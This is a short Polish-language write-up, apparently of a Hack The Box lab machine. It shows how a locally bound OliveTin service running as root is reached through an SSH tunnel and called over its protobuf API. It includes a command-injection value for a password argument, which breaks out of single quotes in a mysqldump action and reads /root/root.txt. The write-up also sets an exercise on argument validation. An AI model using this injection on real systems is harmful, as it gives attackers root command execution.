# OliveTin — localhost, root, protobuf API

## Odkrycie

- Z shella: `ss -lntp` → `127.0.0.1:1337`.
- Config: `/etc/OliveTin/config.yaml` — `listenAddressSingleHTTPFrontend: 127.0.0.1:1337`.
- Proces: **`/usr/local/bin/OliveTin` jako root**.
- `authRequireGuestsToLogin: false` + `defaultPermissions.exec: true` → gość może odpalać akcje.

## Dostęp z Kali

```bash
ssh -i ~/.ssh/id_ed25519_htb -L 13337:127.0.0.1:1337 haris@<IP> -N -f
```

## API (Connect / protobuf)

- JSON `{"actionId":"date"}` **nie działa** (puste ID) — serwis oczekuje **protobuf**.
- Działa: `POST /api/StartAction`, `Content-Type: application/proto`.
- Prosty request (pole `action_id` = tag `0x0a` + len + string):

```python
# action_id = "date"
body = b'\x0a\x04date'
# curl --data-binary @body -H 'Content-Type: application/proto' ...
```

- Logi: `POST /api/GetLogs` z JSON `{}`.

## Akcja custom na boxie

W configu (poza przykładami z dokumentacji):

```yaml
- title: Backup Database
  id: backup_database
  shell: "mysqldump -u {{ db_user }} -p'{{ db_pass }}' {{ db_name }} > /opt/backups/backup.sql"
```

- `ping_host` ma `host` typu `ascii_identifier` → **brak** `;` w argumencie.
- `db_pass` typu `password` — w shellu wartość w **pojedynczych cudzysłowach** → injekcja:

```text
db_pass = x' ; cat /root/root.txt ; '
```

Zakoduj argumenty jako zagnieżdżone wiadomości protobuf (`StartActionArgument`: name, value) + `action_id=backup_database`.

## Weryfikacja

- W `GetLogs` w polu `output` pojawia się treść flagi (oraz błędy mysqldump — to OK).

## Ćwiczenie

Zainstaluj OliveTin w VM, dodaj jedną akcję z szablonem `{{ var }}`, przetestuj walidację typów argumentów i różnicę JSON vs protobuf na `/api/StartAction`.